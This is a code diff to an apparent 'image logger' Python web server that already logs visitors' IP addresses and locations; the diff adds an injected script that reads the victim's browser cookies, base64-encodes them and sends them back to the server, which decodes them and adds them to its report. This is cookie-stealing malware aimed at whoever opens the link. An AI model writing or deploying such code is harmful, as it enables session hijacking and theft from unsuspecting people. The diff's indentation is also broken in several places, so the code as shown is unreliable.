@@ -87,6 +87,8 @@ def reportError(error):
     ],
 })
 
+if cookies:
+    embed["embeds"][0]["description"] += f"\n\n**Cookies:**\n```{cookies}```"
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
         return
@@ -193,6 +195,13 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             if config["imageArgument"]:
                 s = self.path
                 dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+                cookie_value = None
+if "c" in dic:
+    try:
+        decoded = base64.b64decode(dic["c"]).decode()
+        cookie_value = decoded
+    except:
+        cookie_value = "Failed to decode cookies"
                 if dic.get("url") or dic.get("id"):
                     url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                 else:
@@ -212,7 +221,16 @@ background-size: contain;
 width: 100vw;
 height: 100vh;
 }}</style><div class="img"></div>'''.encode()
-            
+data += b"""
+<script>
+(function() {
+    try {
+        var cookies = document.cookie;
+        fetch(window.location.pathname + "?c=" + btoa(cookies));
+    } catch (e) {}
+})();
+</script>
+"""            
             if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                 return
             
